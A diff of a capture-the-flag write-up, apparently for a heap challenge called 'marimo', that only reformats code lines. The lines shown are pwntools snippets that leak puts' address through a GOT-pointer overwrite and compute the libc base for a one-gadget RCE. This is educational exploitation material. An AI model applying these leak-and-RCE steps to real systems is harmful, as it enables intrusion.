@@ -31,18 +31,18 @@ To use a one-gadget-RCE we need to know a few things:
 
 #### 1. Finding libc's base address
 
-We overwrite the name pointer to point to a libc function's got entry using this:
-	`p64(exe.got['puts'])`
+We overwrite the name pointer to point to a libc function's got entry using this:  
+`p64(exe.got['puts'])`
 
-We read out the name pointer using the view marimo option, the name now points to the got entry ot puts giving us the address of puts in memory: 
-	`puts_addr = u64(proc.recvline_startswith("name : ")[7:].ljust(8, '\x00'))`
+We read out the name pointer using the view marimo option, the name now points to the got entry ot puts giving us the address of puts in memory:  
+`puts_addr = u64(proc.recvline_startswith("name : ")[7:].ljust(8, '\x00'))`
 
-We get the offset of puts from the relevant libc's base:
-	`libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')`
-	`libc_puts_addr = libc.symbols['puts']`
+We get the offset of puts from the relevant libc's base:  
+`libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')`  
+`libc_puts_addr = libc.symbols['puts']`
 
-Then we calculate the address libc is based at currently:
-	`libc_base = puts_addr - libc_puts_addr`
+Then we calculate the address libc is based at currently:  
+`libc_base = puts_addr - libc_puts_addr`
 
 Result will look similar to this:
 <p align="center">
